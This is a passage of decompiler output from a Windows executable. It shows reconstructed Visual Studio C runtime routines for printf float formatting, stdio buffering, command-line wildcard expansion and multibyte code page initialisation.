  int iVar4;
  uint uVar5;
  bool local_8;
  
  if (param_2 == (char *)0x0) {
    piVar2 = __errno();
    iVar4 = 0x16;
    *piVar2 = 0x16;
    FUN_004091be();
  }
  else if (((param_3 == 0) || (param_4 == (char *)0x0)) || (param_5 == 0)) {
    piVar2 = __errno();
    iVar4 = 0x16;
    *piVar2 = 0x16;
    FUN_004091be();
  }
  else {
    if (((param_6 == 0x41) || (param_6 == 0x45)) ||
       ((param_6 == 0x46 || (local_8 = false, param_6 == 0x47)))) {
      local_8 = true;
    }
    if (((param_8 & 8) == 0) && (_Var3 = __acrt_fp_classify(param_1), _Var3 != 0)) {
      bVar1 = __acrt_fp_is_negative(param_1);
      iVar4 = fp_format_nan_or_infinity(_Var3,bVar1,param_2,param_3,local_8);
    }
    else {
      if ((param_8 & 0x10) == 0) {
        uVar5 = 2;
      }
      else {
        uVar5 = 3;
      }
      if (param_6 < 0x62) {
        if ((param_6 == 0x61) || (param_6 == 0x41)) {
          iVar4 = fp_format_a(param_1,param_2,param_3,param_4,param_5,param_7,local_8,uVar5,param_10
                             );
          return iVar4;
        }
        iVar4 = param_6 + -0x45;
      }
      else {
        iVar4 = param_6 + -0x65;
      }
      if (iVar4 == 0) {
        iVar4 = fp_format_e(param_1,param_2,param_3,param_4,param_5,param_7,local_8,uVar5,param_10);
      }
      else if (iVar4 == 1) {
        iVar4 = fp_format_f(param_1,param_2,param_3,param_4,param_5,param_7,param_10);
      }
      else {
        iVar4 = fp_format_g(param_1,param_2,param_3,param_4,param_5,param_7,local_8,uVar5,param_10);
      }
    }
  }
  return iVar4;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2015 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    return -1;
  }
  return _File->_file;
}



// Library Function - Single Match
//  __fputc_nolock
// 
// Library: Visual Studio 2015 Release

uint __cdecl __fputc_nolock(byte param_1,FILE *param_2)

{
  char **ppcVar1;
  uint uVar2;
  
  ppcVar1 = &param_2->_base;
  *ppcVar1 = *ppcVar1 + -1;
  if ((int)*ppcVar1 < 0) {
    uVar2 = ___acrt_stdio_flush_and_write_narrow_nolock(param_1,param_2);
    return uVar2;
  }
  *param_2->_ptr = param_1;
  param_2->_ptr = param_2->_ptr + 1;
  return (uint)param_1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __get_printf_count_output
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(_DAT_0041c1cc == (DAT_0041b004 | 1));
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___acrt_stdio_begin_temporary_buffering_nolock
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___acrt_stdio_begin_temporary_buffering_nolock(FILE *param_1)

{
  int *piVar1;
  int iVar2;
  FILE *pFVar3;
  char *pcVar4;
  char **ppcVar5;
  
  iVar2 = __fileno(param_1);
  iVar2 = __isatty(iVar2);
  if (iVar2 == 0) {
    return 0;
  }
  pFVar3 = (FILE *)___acrt_iob_func(1);
  if (param_1 == pFVar3) {
    ppcVar5 = (char **)&DAT_0041c1d0;
  }
  else {
    pFVar3 = (FILE *)___acrt_iob_func(2);
    if (param_1 != pFVar3) goto LAB_0040af4b;
    ppcVar5 = (char **)&DAT_0041c1d4;
  }
  _DAT_0041bc58 = _DAT_0041bc58 + 1;
  piVar1 = &param_1->_flag;
  pFVar3 = (FILE *)*piVar1;
  if (((uint)pFVar3 & 0x4c0) != 0) {
LAB_0040af4b:
    return (uint)pFVar3 & 0xffffff00;
  }
  LOCK();
  *piVar1 = *piVar1 | 0x282;
  pcVar4 = *ppcVar5;
  if (pcVar4 == (char *)0x0) {
    pcVar4 = (char *)__malloc_base(0x1000);
    *ppcVar5 = pcVar4;
    FID_conflict__free((void *)0x0);
    pcVar4 = *ppcVar5;
    if (pcVar4 == (char *)0x0) {
      param_1->_base = (char *)0x2;
      param_1->_cnt = (int)&param_1->_charbuf;
      param_1->_ptr = (char *)&param_1->_charbuf;
      param_1->_bufsiz = 2;
      goto LAB_0040af47;
    }
  }
  param_1->_cnt = (int)pcVar4;
  pcVar4 = *ppcVar5;
  param_1->_ptr = pcVar4;
  param_1->_base = (char *)0x1000;
  param_1->_bufsiz = 0x1000;
LAB_0040af47:
  return CONCAT31((int3)((uint)pcVar4 >> 8),1);
}



// Library Function - Single Match
//  ___acrt_stdio_end_temporary_buffering_nolock
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_stdio_end_temporary_buffering_nolock(char param_1,FILE *param_2)

{
  int *piVar1;
  
  if ((param_1 != '\0') && (piVar1 = &param_2->_flag, ((uint)*piVar1 >> 9 & 1) != 0)) {
    ___acrt_stdio_flush_nolock(param_2);
    LOCK();
    *piVar1 = *piVar1 & 0xfffffd7f;
    param_2->_bufsiz = 0;
    param_2->_cnt = 0;
    param_2->_ptr = (char *)0x0;
  }
  return;
}



uint __cdecl FUN_0040af8b(uint param_1,uint param_2)

{
  if (param_2 >= param_1 && param_2 != param_1) {
    return 0xffffffff;
  }
  return (uint)(param_2 < param_1);
}



int __cdecl FUN_0040afa3(uchar **param_1,LPVOID *param_2)

{
  char *pcVar1;
  char cVar2;
  code *pcVar3;
  char **ppcVar4;
  int *piVar5;
  uchar *puVar6;
  LPVOID pvVar7;
  char *pcVar8;
  char **ppcVar9;
  int iVar10;
  char *pcVar11;
  char **ppcVar12;
  char **local_24;
  char **local_20;
  undefined4 local_1c;
  int local_18;
  char *local_14;
  char *local_10;
  char *local_c;
  undefined4 local_8;
  
  if (param_2 == (LPVOID *)0x0) {
    piVar5 = __errno();
    iVar10 = 0x16;
    *piVar5 = 0x16;
    FUN_004091be();
  }
  else {
    *param_2 = (LPVOID)0x0;
    local_24 = (char **)0x0;
    local_20 = (char **)0x0;
    local_1c = 0;
    puVar6 = *param_1;
    ppcVar12 = local_24;
    ppcVar4 = local_20;
    while (local_24 = ppcVar12, local_20 = ppcVar4, puVar6 != (uchar *)0x0) {
      local_8 = (char *)CONCAT13((char)((uint)local_8 >> 0x18),0x3f2a);
      puVar6 = (uchar *)_strpbrk((char *)*param_1,(char *)&local_8);
      if (puVar6 == (uchar *)0x0) {
        iVar10 = copy_and_add_argument_to_buffer__((char *)*param_1,0,0,&local_24);
      }
      else {
        iVar10 = expand_argument_wildcards__(*param_1,puVar6,(int *)&local_24);
      }
      if (iVar10 != 0) goto LAB_0040b115;
      param_1 = param_1 + 1;
      ppcVar12 = local_24;
      ppcVar4 = local_20;
      puVar6 = *param_1;
    }
    local_c = (char *)0x0;
    local_8 = (char *)0x0;
    local_10 = (char *)(((int)ppcVar4 - (int)ppcVar12 >> 2) + 1);
    pcVar11 = (char *)(~-(uint)(ppcVar4 < ppcVar12) & ((int)ppcVar4 - (int)ppcVar12) + 3U >> 2);
    if (pcVar11 != (char *)0x0) {
      local_8 = (char *)0x0;
      ppcVar9 = ppcVar12;
      do {
        pcVar8 = *ppcVar9;
        pcVar1 = pcVar8 + 1;
        do {
          cVar2 = *pcVar8;
          pcVar8 = pcVar8 + 1;
        } while (cVar2 != '\0');
        local_8 = pcVar8 + (int)(local_8 + (1 - (int)pcVar1));
        ppcVar9 = ppcVar9 + 1;
        local_c = local_c + 1;
      } while (local_c != pcVar11);
    }
    pvVar7 = ___acrt_allocate_buffer_for_argv((uint)local_10,(uint)local_8,1);
    if (pvVar7 == (LPVOID)0x0) {
      iVar10 = -1;
    }
    else {
      local_10 = (char *)((int)pvVar7 + (int)local_10 * 4);
      local_14 = local_10;
      if (ppcVar12 != ppcVar4) {
        local_18 = (int)pvVar7 - (int)ppcVar12;
        do {
          local_c = *ppcVar12;
          pcVar11 = local_c + 1;
          do {
            cVar2 = *local_c;
            local_c = local_c + 1;
          } while (cVar2 != '\0');
          local_c = local_c + (1 - (int)pcVar11);
          iVar10 = FUN_0041016b(local_10,(int)(local_14 + ((int)local_8 - (int)local_10)),
                                (int)*ppcVar12,(int)local_c);
          if (iVar10 != 0) {
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
            pcVar3 = (code *)swi(3);
            iVar10 = (*pcVar3)();
            return iVar10;
          }
          *(char **)(local_18 + (int)ppcVar12) = local_10;
          ppcVar12 = ppcVar12 + 1;
          local_10 = local_10 + (int)local_c;
        } while (ppcVar12 != ppcVar4);
      }
      iVar10 = 0;
      *param_2 = pvVar7;
    }
    FID_conflict__free((void *)0x0);
LAB_0040b115:
    _argument_list__(&local_24);
  }
  return iVar10;
}



// Library Function - Multiple Matches With Same Base Name
//  int __cdecl copy_and_add_argument_to_buffer<char>(char const * const,char const * const,unsigned
// int,class `anonymous namespace'::argument_list<char>&)
//  int __cdecl copy_and_add_argument_to_buffer<char>(char const * const,char const * const,unsigned
// int,class `anonymous namespace'::argument_list<char>&)
// 
// Library: Visual Studio 2015 Release

int __cdecl copy_and_add_argument_to_buffer__(char *param_1,int param_2,int param_3,void *param_4)

{
  char cVar1;
  code *pcVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  
  pcVar5 = param_1;
  do {
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + 1;
  } while (cVar1 != '\0');
  pcVar5 = pcVar5 + (1 - (int)(param_1 + 1));
  if ((char *)(-1 - param_3) < pcVar5) {
    iVar3 = 0xc;
  }
  else {
    pcVar6 = pcVar5 + param_3 + 1;
    pcVar4 = (char *)__calloc_base((uint)pcVar6,1);
    if (param_3 != 0) {
      iVar3 = FUN_0041016b(pcVar4,(int)pcVar6,param_2,param_3);
      if (iVar3 != 0) goto LAB_0040b1bc;
    }
    iVar3 = FUN_0041016b(pcVar4 + param_3,(int)pcVar6 - param_3,(int)param_1,(int)pcVar5);
    if (iVar3 != 0) {
LAB_0040b1bc:
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      pcVar2 = (code *)swi(3);
      iVar3 = (*pcVar2)();
      return iVar3;
    }
    iVar3 = append(param_4,pcVar4);
    FID_conflict__free((void *)0x0);
  }
  return iVar3;
}



// Library Function - Multiple Matches With Same Base Name
//  int __cdecl expand_argument_wildcards<char>(char * const,char * const,class `anonymous
// namespace'::argument_list<char>&)
//  int __cdecl expand_argument_wildcards<char>(char * const,char * const,class `anonymous
// namespace'::argument_list<char>&)
// 
// Library: Visual Studio 2015 Release

void __cdecl expand_argument_wildcards__(uchar *param_1,uchar *param_2,int *param_3)

{
  uchar uVar1;
  byte bVar2;
  HANDLE hFindFile;
  int iVar3;
  BOOL BVar4;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar5;
  int extraout_EDX;
  int iVar6;
  int extraout_EDX_00;
  int extraout_EDX_01;
  undefined uVar7;
  int in_stack_fffffeac;
  _WIN32_FIND_DATAA local_148;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  for (; (((uVar7 = (undefined)in_stack_fffffeac, param_2 != param_1 &&
           (uVar1 = *param_2, uVar1 != '/')) && (uVar1 != '\\')) && (uVar1 != ':'));
      param_2 = __mbsdec(param_1,param_2)) {
  }
  uVar1 = *param_2;
  if ((uVar1 == ':') && (param_2 != param_1 + 1)) {
    copy_and_add_argument_to_buffer__((char *)param_1,0,0,param_3);
    uVar5 = extraout_DL;
  }
  else {
    if ((uVar1 == '/') || ((uVar1 == '\\' || (uVar1 == ':')))) {
      bVar2 = 1;
    }
    else {
      bVar2 = 0;
    }
    _memset(&local_148,0,0x140);
    hFindFile = FindFirstFileExA((LPCSTR)param_1,FindExInfoStandard,&local_148,FindExSearchNameMatch
                                 ,(LPVOID)0x0,0);
    if (hFindFile == (HANDLE)0xffffffff) {
      copy_and_add_argument_to_buffer__((char *)param_1,0,0,param_3);
      iVar6 = extraout_EDX;
    }
    else {
      in_stack_fffffeac = param_3[1] - *param_3 >> 2;
      do {
        if (((local_148.cFileName[0] != '.') ||
            ((local_148.cFileName[1] != '\0' &&
             ((local_148.cFileName[1] != '.' || (local_148.cFileName[2] != '\0')))))) &&
           (iVar3 = copy_and_add_argument_to_buffer__
                              (local_148.cFileName,(int)param_1,
                               -(uint)bVar2 & (uint)(param_2 + (1 - (int)param_1)),param_3),
           iVar6 = extraout_EDX_00, iVar3 != 0)) goto LAB_0040b299;
        BVar4 = FindNextFileA(hFindFile,&local_148);
      } while (BVar4 != 0);
      iVar6 = *param_3;
      iVar3 = param_3[1] - iVar6 >> 2;
      if (in_stack_fffffeac != iVar3) {
        _qsort((void *)(iVar6 + in_stack_fffffeac * 4),iVar3 - in_stack_fffffeac,4,FUN_0040af8b);
        iVar6 = extraout_EDX_01;
      }
    }
LAB_0040b299:
    uVar7 = (undefined)in_stack_fffffeac;
    uVar5 = (undefined)iVar6;
    if (hFindFile != (HANDLE)0xffffffff) {
      FindClose(hFindFile);
      uVar5 = extraout_DL_00;
    }
  }
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar5,uVar7);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall `anonymous namespace'::argument_list<char>::~argument_list<char>(void)
//  public: __thiscall `anonymous namespace'::argument_list<char>::~argument_list<char>(void)
//  public: __thiscall `anonymous namespace'::argument_list<wchar_t>::~argument_list<wchar_t>(void)
//  public: __thiscall `anonymous namespace'::argument_list<wchar_t>::~argument_list<wchar_t>(void)
// 
// Library: Visual Studio 2015 Release

void __fastcall _argument_list__(void **param_1)

{
  void **ppvVar1;
  
  for (ppvVar1 = (void **)*param_1; ppvVar1 != (void **)param_1[1]; ppvVar1 = ppvVar1 + 1) {
    FID_conflict__free(*ppvVar1);
  }
  FID_conflict__free(*param_1);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: int __thiscall `anonymous namespace'::argument_list<char>::append(char * const)
//  public: int __thiscall `anonymous namespace'::argument_list<char>::append(char * const)
// 
// Library: Visual Studio 2015 Release

int __thiscall append(void *this,void *param_1)

{
  int iVar1;
  
  iVar1 = expand_if_necessary((void **)this);
  if (iVar1 == 0) {
    **(void ***)((int)this + 4) = param_1;
    *(int *)((int)this + 4) = *(int *)((int)this + 4) + 4;
    iVar1 = 0;
  }
  else {
    FID_conflict__free(param_1);
  }
  return iVar1;
}



// Library Function - Multiple Matches With Same Base Name
//  private: int __thiscall `anonymous namespace'::argument_list<char>::expand_if_necessary(void)
//  private: int __thiscall `anonymous namespace'::argument_list<char>::expand_if_necessary(void)
//  private: int __thiscall `anonymous namespace'::argument_list<wchar_t>::expand_if_necessary(void)
//  private: int __thiscall `anonymous namespace'::argument_list<wchar_t>::expand_if_necessary(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall expand_if_necessary(void **param_1)

{
  undefined4 uVar1;
  LPVOID pvVar2;
  void *pvVar3;
  uint uVar4;
  
  if (param_1[1] == param_1[2]) {
    if (*param_1 == (void *)0x0) {
      pvVar2 = __calloc_base(4,4);
      *param_1 = pvVar2;
      FID_conflict__free((void *)0x0);
      pvVar3 = *param_1;
      if (pvVar3 != (void *)0x0) {
        param_1[1] = pvVar3;
        param_1[2] = (void *)((int)pvVar3 + 0x10);
        goto LAB_0040b3b5;
      }
    }
    else {
      uVar4 = (int)param_1[2] - (int)*param_1 >> 2;
      if (uVar4 < 0x80000000) {
        pvVar3 = (void *)FUN_0040c78c(*param_1,uVar4 * 2,4);
        if (pvVar3 == (void *)0x0) {
          uVar1 = 0xc;
        }
        else {
          *param_1 = pvVar3;
          param_1[1] = (void *)((int)pvVar3 + uVar4 * 4);
          param_1[2] = (void *)((int)pvVar3 + uVar4 * 8);
          uVar1 = 0;
        }
        FID_conflict__free((void *)0x0);
        return uVar1;
      }
    }
    uVar1 = 0xc;
  }
  else {
LAB_0040b3b5:
    uVar1 = 0;
  }
  return uVar1;
}



void __cdecl FUN_0040b42e(uchar **param_1,LPVOID *param_2)

{
  FUN_0040afa3(param_1,param_2);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_978dc153c237d78434369da87b74ff60>,class <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>&,class
// <lambda_4a8533e2866a575feecb8298ce776b0d>>(class
// <lambda_978dc153c237d78434369da87b74ff60>&&,class
// <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>&,class <lambda_4a8533e2866a575feecb8298ce776b0d>&&)
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_seh_guarded_call<void>::
operator___class__lambda_978dc153c237d78434369da87b74ff60__class__lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c___class__lambda_4a8533e2866a575feecb8298ce776b0d___
          (__crt_seh_guarded_call_void_ *this,_lambda_978dc153c237d78434369da87b74ff60_ *param_1,
          _lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ *param_2,
          _lambda_4a8533e2866a575feecb8298ce776b0d_ *param_3)

{
  ___acrt_lock(*(int *)param_1);
  <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>::operator__(param_2);
  FUN_0040b470();
  return;
}



void FUN_0040b470(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// Library Function - Single Match
//  void __cdecl __acrt_lock_and_call<class <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>>(enum
// __acrt_lock_id,class <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>&&)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__acrt_lock_and_call_class__lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c___
          (__acrt_lock_id param_1,_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ *param_2)

{
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  __crt_seh_guarded_call_void_ local_5;
  
  local_c = param_1;
  local_10 = param_1;
  __crt_seh_guarded_call<void>::
  operator___class__lambda_978dc153c237d78434369da87b74ff60__class__lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c___class__lambda_4a8533e2866a575feecb8298ce776b0d___
            (&local_5,(_lambda_978dc153c237d78434369da87b74ff60_ *)&local_10,param_2,
             (_lambda_4a8533e2866a575feecb8298ce776b0d_ *)&local_c);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  public: void __thiscall <lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>::operator()(void)const 
// 
// Library: Visual Studio 2015 Release

void __thiscall
<lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c>::operator__
          (_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ *this)

{
  int iVar1;
  
  _DAT_0041c1e0 = *(undefined4 *)(*(int *)(**(int **)this + 0x48) + 4);
  _DAT_0041c1e4 = *(undefined4 *)(*(int *)(**(int **)this + 0x48) + 8);
  _DAT_0041c1dc = *(undefined4 *)(*(int *)(**(int **)this + 0x48) + 0x21c);
  _memcpy_s(&DAT_0041c1e8,0xc,(void *)(*(int *)(**(int **)this + 0x48) + 0xc),0xc);
  _memcpy_s(&DAT_0041b2e8,0x101,(void *)(*(int *)(**(int **)this + 0x48) + 0x18),0x101);
  _memcpy_s(&DAT_0041b3f0,0x100,(void *)(*(int *)(**(int **)this + 0x48) + 0x119),0x100);
  LOCK();
  iVar1 = *(int *)PTR_DAT_0041b710;
  *(int *)PTR_DAT_0041b710 = iVar1 + -1;
  if ((iVar1 + -1 == 0) && ((undefined4 *)PTR_DAT_0041b710 != &DAT_0041b4f0)) {
    FID_conflict__free(PTR_DAT_0041b710);
  }
  PTR_DAT_0041b710 = *(undefined **)(**(int **)this + 0x48);
  LOCK();
  **(int **)(**(int **)this + 0x48) = **(int **)(**(int **)this + 0x48) + 1;
  return;
}



// Library Function - Single Match
//  wchar_t const * __cdecl CPtoLocaleName(int)
// 
// Library: Visual Studio 2015 Release

wchar_t * __cdecl CPtoLocaleName(int param_1)

{
  if (param_1 == 0x3a4) {
    return (wchar_t *)L"ja-JP";
  }
  if (param_1 == 0x3a8) {
    return (wchar_t *)L"zh-CN";
  }
  if (param_1 == 0x3b5) {
    return (wchar_t *)L"ko-KR";
  }
  if (param_1 != 0x3b6) {
    return (wchar_t *)0x0;
  }
  return (wchar_t *)L"zh-TW";
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2015 Release

int __cdecl getSystemCP(int param_1)

{
  int local_14;
  int local_10;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,(__crt_locale_pointers *)0x0);
  _DAT_0041c1f4 = 0;
  if (param_1 == -2) {
    _DAT_0041c1f4 = 1;
    param_1 = GetOEMCP();
  }
  else if (param_1 == -3) {
    _DAT_0041c1f4 = 1;
    param_1 = GetACP();
  }
  else if (param_1 == -4) {
    _DAT_0041c1f4 = 1;
    param_1 = *(UINT *)(local_10 + 8);
  }
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
  }
  return param_1;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct __crt_multibyte_data *)
// 
// Library: Visual Studio 2015 Release

void __cdecl setSBCS(__crt_multibyte_data *param_1)

{
  int iVar1;
  __crt_multibyte_data *p_Var2;
  
  p_Var2 = param_1 + 0x18;
  _memset(p_Var2,0,0x101);
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x21c) = 0;
  iVar1 = 0x101;
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  do {
    *p_Var2 = p_Var2[(int)&DAT_0041b4f0 - (int)param_1];
    p_Var2 = p_Var2 + 1;
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  p_Var2 = param_1 + 0x119;
  iVar1 = 0x100;
  do {
    *p_Var2 = p_Var2[(int)&DAT_0041b4f0 - (int)param_1];
    p_Var2 = p_Var2 + 1;
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct __crt_multibyte_data *)
// 
// Library: Visual Studio 2015 Release

void __cdecl setSBUpLow(__crt_multibyte_data *param_1)

{
  byte bVar1;
  __crt_multibyte_data _Var2;
  BOOL BVar3;
  uint uVar4;
  BYTE *pBVar5;
  char extraout_DL;
  char cVar6;
  __crt_multibyte_data *p_Var7;
  int in_stack_fffff8dc;
  _cpinfo local_71c;
  WORD local_708 [512];
  __crt_multibyte_data local_308 [256];
  __crt_multibyte_data local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(param_1 + 4),&local_71c);
  if (BVar3 == 0) {
    uVar4 = 0;
    in_stack_fffff8dc = -0x61 - (int)(param_1 + 0x119);
    do {
      p_Var7 = param_1 + uVar4 + 0x119;
      if (p_Var7 + in_stack_fffff8dc + 0x20 < (__crt_multibyte_data *)0x1a) {
        param_1[uVar4 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar4 + 0x19] | 0x10);
        _Var2 = (__crt_multibyte_data)((char)uVar4 + ' ');
LAB_0040b7ea:
        *p_Var7 = _Var2;
      }
      else {
        if (p_Var7 + in_stack_fffff8dc < (__crt_multibyte_data *)0x1a) {
          param_1[uVar4 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar4 + 0x19] | 0x20);
          _Var2 = (__crt_multibyte_data)((char)uVar4 + -0x20);
          goto LAB_0040b7ea;
        }
        *p_Var7 = (__crt_multibyte_data)0x0;
      }
      cVar6 = (char)param_1 + '\x19';
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    pBVar5 = local_71c.LeadByte;
    local_108[0] = ' ';
    while (local_71c.LeadByte[0] != 0) {
      bVar1 = pBVar5[1];
      for (uVar4 = (uint)local_71c.LeadByte[0]; (uVar4 <= bVar1 && (uVar4 < 0x100));
          uVar4 = uVar4 + 1) {
        local_108[uVar4] = ' ';
      }
      pBVar5 = pBVar5 + 2;
      local_71c.LeadByte[0] = *pBVar5;
    }
    ___acrt_GetStringTypeA
              ((__crt_locale_pointers *)0x0,1,local_108,0x100,local_708,*(UINT *)(param_1 + 4),0);
    ___acrt_LCMapStringA
              ((__crt_locale_pointers *)0x0,*(wchar_t **)(param_1 + 0x21c),0x100,local_108,0x100,
               (char *)local_208,0x100,*(int *)(param_1 + 4),0);
    ___acrt_LCMapStringA
              ((__crt_locale_pointers *)0x0,*(wchar_t **)(param_1 + 0x21c),0x200,local_108,0x100,
               (char *)local_308,0x100,*(int *)(param_1 + 4),0);
    uVar4 = 0;
    do {
      if ((local_708[uVar4] & 1) == 0) {
        if ((local_708[uVar4] & 2) != 0) {
          param_1[uVar4 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar4 + 0x19] | 0x20);
          _Var2 = local_308[uVar4];
          goto LAB_0040b791;
        }
        param_1[uVar4 + 0x119] = (__crt_multibyte_data)0x0;
      }
      else {
        param_1[uVar4 + 0x19] = (__crt_multibyte_data)((byte)param_1[uVar4 + 0x19] | 0x10);
        _Var2 = local_208[uVar4];
LAB_0040b791:
        param_1[uVar4 + 0x119] = _Var2;
      }
      uVar4 = uVar4 + 1;
      cVar6 = extraout_DL;
    } while (uVar4 < 0x100);
  }
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,cVar6,(char)in_stack_fffff8dc);
  return;
}



// Library Function - Single Match
//  int __cdecl setmbcp_internal(int,bool)
// 
// Library: Visual Studio 2015 Release

int __cdecl setmbcp_internal(int param_1,bool param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  __acrt_ptd **local_10 [2];
  __acrt_ptd *local_8;
  
  local_8 = ___acrt_getptd();
  ___acrt_update_thread_multibyte_data();
  local_10[0] = (__acrt_ptd **)getSystemCP(param_1);
  if (local_10[0] == *(__acrt_ptd ***)(*(int *)(local_8 + 0x48) + 4)) {
    return 0;
  }
  puVar2 = (undefined4 *)__malloc_base(0x220);
  if (puVar2 != (undefined4 *)0x0) {
    puVar6 = *(undefined4 **)(local_8 + 0x48);
    puVar5 = puVar2;
    for (iVar4 = 0x88; iVar4 != 0; iVar4 = iVar4 + -1) {
      *puVar5 = *puVar6;
      puVar6 = puVar6 + 1;
      puVar5 = puVar5 + 1;
    }
    *puVar2 = 0;
    iVar4 = __setmbcp_nolock((int)local_10[0],(__crt_multibyte_data *)puVar2);
    if (iVar4 != -1) {
      if (param_2 == false) {
        ___acrt_set_locale_changed();
      }
      piVar3 = *(int **)(local_8 + 0x48);
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = *piVar3 + -1;
      if ((iVar1 == 1) && (*(undefined4 **)(local_8 + 0x48) != &DAT_0041b4f0)) {
        FID_conflict__free(*(void **)(local_8 + 0x48));
      }
      *puVar2 = 1;
      puVar6 = (undefined4 *)0x0;
      *(undefined4 **)(local_8 + 0x48) = puVar2;
      if ((((byte)local_8[0x350] & 2) == 0) && (((byte)DAT_0041b770 & 1) == 0)) {
        local_10[0] = &local_8;
        __acrt_lock_and_call_class__lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c___
                  (5,(_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ *)local_10);
        if (param_2 != false) {
          PTR_DAT_0041b1ec = PTR_DAT_0041b710;
        }
      }
      goto LAB_0040b889;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  iVar4 = -1;
  puVar6 = puVar2;
LAB_0040b889:
  FID_conflict__free(puVar6);
  return iVar4;
}



// Library Function - Single Match
//  ___acrt_initialize_multibyte
// 
// Library: Visual Studio 2015 Release

undefined4 ___acrt_initialize_multibyte(void)

{
  int in_EAX;
  
  if (DAT_0041c1f8 == '\0') {
    in_EAX = setmbcp_internal(-3,true);
    DAT_0041c1f8 = '\x01';
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___acrt_update_thread_multibyte_data
// 
// Library: Visual Studio 2015 Release

int * ___acrt_update_thread_multibyte_data(void)

{
  int iVar1;
  __acrt_ptd *p_Var2;
  int *_Memory;
  
  p_Var2 = ___acrt_getptd();
  if ((*(uint *)(p_Var2 + 0x350) & DAT_0041b770) == 0) goto LAB_0040b968;
  if (*(int *)(p_Var2 + 0x4c) == 0) goto LAB_0040b968;
  _Memory = *(int **)(p_Var2 + 0x48);
  while (_Memory == (int *)0x0) {
    _abort();
LAB_0040b968:
    ___acrt_lock(5);
    _Memory = *(int **)(p_Var2 + 0x48);
    if (_Memory != (int *)PTR_DAT_0041b710) {
      if (_Memory != (int *)0x0) {
        LOCK();
        iVar1 = *_Memory;
        *_Memory = iVar1 + -1;
        if ((iVar1 + -1 == 0) && (_Memory != &DAT_0041b4f0)) {
          FID_conflict__free(_Memory);
        }
      }
